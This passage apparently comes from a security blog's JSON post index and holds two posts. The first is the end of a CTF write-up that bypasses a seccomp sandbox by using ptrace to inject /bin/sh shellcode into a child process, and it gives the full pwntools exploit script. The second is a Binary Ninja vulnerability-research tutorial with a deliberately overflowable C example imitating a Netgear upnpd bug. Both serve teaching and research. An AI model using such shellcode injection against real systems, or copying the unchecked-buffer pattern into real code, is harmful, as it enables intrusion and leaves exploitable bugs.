0012: 0x15 0x0c 0x00 0x00000018 if (A == sched_yield) goto 0025 0013: 0x15 0x0b 0x00 0x00000020 if (A == dup) goto 0025 0014: 0x15 0x0a 0x00 0x00000021 if (A == dup2) goto 0025 0015: 0x15 0x09 0x00 0x00000038 if (A == clone) goto 0025 0016: 0x15 0x08 0x00 0x0000003c if (A == exit) goto 0025 0017: 0x15 0x07 0x00 0x0000003e if (A == kill) goto 0025 0018: 0x15 0x06 0x00 0x00000050 if (A == chdir) goto 0025 0019: 0x15 0x05 0x00 0x00000051 if (A == fchdir) goto 0025 0020: 0x15 0x04 0x00 0x00000060 if (A == gettimeofday) goto 0025 0021: 0x15 0x03 0x00 0x00000065 if (A == ptrace) goto 0025 0022: 0x15 0x02 0x00 0x00000066 if (A == getuid) goto 0025 0023: 0x15 0x01 0x00 0x00000068 if (A == getgid) goto 0025 0024: 0x15 0x00 0x01 0x000000e7 if (A != exit_group) goto 0026 0025: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0026: 0x06 0x00 0x00 0x00000000 return KILLSimplified view of above rulesallowed syscalls close stat fstat lstat mprotect brk access sched_yield dup dup2 clone exit kill chdir fchdir gettimeofday ptrace getuid getgid exit_groupLooking at these syscall, only write primitive syscall was ptrace and also the challenge is called trace_story so it is very obvious that we would need to use ptrace eventually.SolutionWe can use ptrace to overwrite child’s text segment with our assembly code. Child process executes random code in a infinite loop so we can just overwrite the code in the beginning of the infinite loop.Usual process for using ptrace function goes as followAttach to child process ptrace(PTRACE_ATTACH, CHILD_PID, 0, 0) -&gt; Wait for child to attach wait(0) -&gt; Write to child’s text segment to change the code by ptrace(PTRACE_POKETEXT, CHILD_PID, CODE_ADDRESS, 8_BYTES_OF_CODE) -&gt; Detach from child ptrace(PTRACE_DETACH, CHILD_PID, 0, 0)Problem is we don’t have wait() in our syscall. So we can probably use gettimeofday and calculate our time that way but as great Ken Thompson said once, When in doubt, use brute force. So I will just attach -&gt; write_text -&gt; detach -&gt; go back to beginning and repeat.Exploit#!/usr/bin/env python3# -*- coding: utf-8 -*-from pwn import *exe = context.binary = ELF('trace_story')context.terminal = ['tmux', 'splitw', '-h']def start(argv=[], *a, **kw): '''Start the exploit against the target.''' if args.GDB: return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw) elif args.REMOTE: return remote(args.HOST, int(args.PORT)) else: return process([exe.path] + argv, *a, **kw)gdbscript = f'''tbreak mainset follow-fork-mode parent# set detach-on-fork offb *0x401907# b *0x401789continue'''.format(**locals())# -- Exploit goes here --\"\"\" Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000)\"\"\"io = start()io.recvuntil(\"pid: \")pid = int(io.recvline().strip())print(f'pid is {pid}')payload = \"begin:\"payload += shellcraft.ptrace(constants.linux.PTRACE_ATTACH, pid, 0, 0)binsh = asm(shellcraft.sh())start_addr = 0x401789for i in range(0, int(len(binsh)/8)): load_shit = u64(binsh[i * 8:8+(i*8)]) payload += shellcraft.ptrace(constants.linux.PTRACE_POKETEXT, pid, start_addr + (i * 8), load_shit)payload += shellcraft.ptrace(constants.linux.PTRACE_DETACH, pid, 0, 0)payload += \"\"\"jmp begin\"\"\"io.sendlineafter(b'Input: \\n', asm(payload))io.interactive()" }, { "title": "Using Binary Ninja for Vulnerability Research", "url": "/posts/bnvr/", "categories": "program analysis", "tags": "binja, vr", "date": "2020-12-07 00:00:00 -0500", "snippet": "IntroductionEver since @cetfor’s video on Auditing system calls for command injection vulnerabilities using Binary Ninja’s HLIL, I have been wanting to learn more about how you can automate discove...", "content": "IntroductionEver since @cetfor’s video on Auditing system calls for command injection vulnerabilities using Binary Ninja’s HLIL, I have been wanting to learn more about how you can automate discovering program incorrectness statically.In this blog series, I will demonstrate to the readers how Binary Ninja can help you in your vulnerability research.This series will be more on the basic of Binary Ninja Scripting rather then program analysis.I should also recommend anyone that wants to learn more about this topic to take Margin Research / Vector35 PAVR (Program Analyiss For Vulnerability Research) training by @Calaquendi44 and @psifertex.Requirement Binary Ninja personal or commerical license Note that at the time of this writing, I am using version 2.4.3072-dev. Snippets pluginOptional but not requiredFirmware is needed if you would like to run this script on real target upnpd binary from firmware mentioned on Grimm BlogTargetNetgear SOHO Devices upnpd Service Pre-Authentication Stack Overflow. Read more about the bug @ Grimm BlogI have made a program that imitates the bug shown above. Bug happens where there is a user controlled input that copies string into stack buffer as long as its less then 1024 bytes. It does not check the size of the passed array.#include &lt;stdio.h&gt;#include &lt;string.h&gt;// Function that passes user controlled buffer and copies data.// Problem here is that overflow_buf should always be initialized with size// greater than or equal to 1024 (0x400)void find_token_get_val(char * overflow_buf, char * user_control_data) { size_t user_data_len = strlen(user_control_data); if (user_data_len &lt; 1024) { strncpy(overflow_buf, user_control_data, user_data_len); }}int main(int argc, char * argv[]) { char overflow_buf[64]; memset(overflow_buf, 0, sizeof(overflow_buf)); find_token_get_val(overflow_buf, argv[1]);}PurposeLooking at the simpiled bug above, it made me wonder if there are any more bugs like this in the same binary. I think it is not reasonable for a function to expect programmers to make sure that the buffer they are passing is always set to size greater than or equal to 1024 bytes. Usually there should be an additional check on the buffer that gets passed into the function just in case the programmer passes in invalid buffer size. So I wanted to see if there are more bugs like this. If they made this kind of mistake before, I believe there might be a similar bug somewhere else in the binary.Analysis Plan Get all the callers for memset function Iterate through all the callers and track the buffer/buffer size that gets passed to memset If there is a call instruction, check if it is find_token_get_val and it uses memset_varChoosing BNILOn this blog, I choose to use HLIL because HLIL would fold aliased variable for me so I don’t have to track state of varible we iterate forward.You can see that the MLIL buffer gets aliased many times. If you have to script this, you would need to track the reference of the variable.In HLIL You don’t have to worry about that! It is folded.MLILHLILDepending on which analysis you do, switching IL might be a good idea. Most people seem to like to do this kind of analysis on MLIL since HLIL might fold instruction you might be looking for. You can learn more about the difference here BNIL OverviewFinal ScriptHere is the end result. I will explain the code belowdef check_var_in_target(instr: HighLevelILCall, memset_vars: dict): if isinstance(instr.dest, HighLevelILConstPtr): if bv.get_function_at(instr.dest.constant).name == \"find_token_get_val\": overflow_buf = instr.params[3] if isinstance(overflow_buf, HighLevelILAddressOf): if isinstance(overflow_buf.src, HighLevelILVar): ofbuf_var = overflow_buf.src.var if ofbuf_var in memset_vars.keys(): print(f\"{ofbuf_var.name}[0x{memset_vars[ofbuf_var][1]:x}] | memset @ 0x{memset_vars[ofbuf_var][0].address:x} -&gt; {bv.get_function_at(instr.dest.constant).name}(0x{bv.get_function_at(instr.dest.constant).start:x}) @ 0x{instr.address:x}\")def main(): memset_callers = None memset_func = None for func in bv.functions: if \"memset\" == func.name: memset_func = func memset_callers = set(func.callers) break for func in memset_callers: memset_vars = {} for bb in func.hlil: for instr in bb: if isinstance(instr, HighLevelILCall): if instr.dest.constant == memset_func.start: if isinstance(instr.params[0], HighLevelILAddressOf): memset_vars[instr.params[0].src.var] = [ instr, instr.params[2].constant, ] else: check_var_in_target(instr, memset_vars) elif isinstance(instr, HighLevelILIf): if isinstance(instr.condition, HighLevelILCmpE): call_instr = instr.condition.left if isinstance(call_instr, HighLevelILCall): check_var_in_target(call_instr, memset_vars) print(\"DONE!\")main()Writing our Binja Script in SnippetsIterating through Binary Ninja HLIL Instruction Get memcpy function from bv (BinaryView) Get list of callers that calls memset Iterate through func.hlil -&gt; bb -&gt; instrmemset_callers = Nonememset_func = Nonefor func in bv.functions: if \"memset\" == func.name: memset_func = func memset_callers = set(func.callers) breakfor func in memset_callers: # stores memset var and size. memset(var_1, 0, 0x30) will store {'var1': 0x30} memset_vars = {} for bb in func.hlil: for instr in bb:Here is how Binary Ninja organizes instructions. Source by @carste1nStore memsets var and size into function scoped dictionary Look for HLIL instruction (instr.operation) that is HLIL_CALL Check if instr.dest.constant is equal to address of memset.start (memset address) Store instr.param[0].src.var.name (var name) and instr.param[2].constant (var size) into memset_vars dictionary.Using BNIL Instruction Graph (Available in Plugins Manager), We are able to visualize all of HLIL_CALL expressionsmemset BNIL instr graphfor func in memset_callers: memset_vars = {} for bb in func.hlil: for instr in bb: if isinstance(instr, HighLevelILCall): if instr.dest.constant == memset_func.start: if isinstance(instr.params[0], HighLevelILAddressOf): memset_vars[instr.params[0].src.var] = [instr, instr.params[2].constant]Check if it calls find_token_get_val using memset varfind_token_get_val instr graphdef check_var_in_target(instr: HighLevelILCall, memset_vars: dict): if isinstance(instr.dest, HighLevelILConstPtr): if bv.get_function_at(instr.dest.constant).name == \"find_token_get_val\": overflow_buf = instr.params[3] if isinstance(overflow_buf, HighLevelILAddressOf): ofbuf_var = overflow_buf.src.var if ofbuf_var in memset_vars.keys(): print(f\"{ofbuf_var.name}[0x{memset_vars[ofbuf_var][1]:x}] | memset @ 0x{memset_vars[ofbuf_var][0].address:x} -&gt; {bv.get_function_at(instr.dest.constant).name}(0x{bv.get_function_at(instr.dest.constant).start:x}) @ 0x{instr.address:x}\")Check ResultImitated Program ResultReal UPNPD Program ResultWelp, that doesn’t make sense. It only gave us one result when there should be about 19 of them. Also, it didn’t really find the bug we were looking for either. So what gives?Adding more expressionsIf you look at the BNIL instr graph for real find_token_get_val, it will make more sense. We need to write a case where the call operation is inside the if operation.BNIL instr graph for find_token_get_valelif isinstance(instr, HighLevelILIf): if isinstance(instr.condition, HighLevelILCmpE): call_instr = instr.condition.left if isinstance(call_instr, HighLevelILCall): check_var_in_target(call_instr, memset_vars)Final ResultAfter adding the expression it finds the 0x40 byte buffer!ImprovementsThe final result was pretty bad. It really only gave us one other instance of this pattern. Well at most there are about 20 of them for find_token_get_val function. When I started writing this script, the purpose of this script was actually more generic. Instead of matching on only find_token_get_val, I matched on every single function that used memset_var. Then I would also check if it is using the var to either memcpy, strcpy, and etc. Then Check if the size that I am writing is bigger than the actual buffer size. But to do so we would need to learn about SSA!ConclusionBinary Ninja is great SRE when you want to do program analysis or automate things. Try modifying this script to be more generic and running the script again on a real target. You will get alot more results. Thank you all for reading my blog!" } ]
